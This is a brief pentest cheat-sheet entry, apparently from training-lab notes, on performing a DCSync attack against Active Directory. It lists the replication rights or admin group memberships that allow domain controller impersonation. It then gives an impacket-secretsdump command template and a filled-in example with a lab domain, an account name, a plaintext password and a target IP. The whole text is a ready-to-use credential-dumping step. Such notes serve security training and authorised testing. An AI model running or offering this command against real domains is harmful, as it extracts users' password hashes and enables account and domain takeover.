# If we have:
# - Replicating Directory Changes
# - Replicating Directory Changes All
# - Replicating Directory Changes in Filtered Set
#
# Or we are part of Domain Admins, Enterprise Admins or Administrator groups we can perform a Domain Controller impersonation.

# If we are in our kali session out from the AD network we could still use the 'impacket-secretsdump' with credentials from a user that fullfills the above requesites.


impacket-secretsdump -just-dc-user <targetuser> <domain>/<username>:"<password"@ip

#For example; impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70


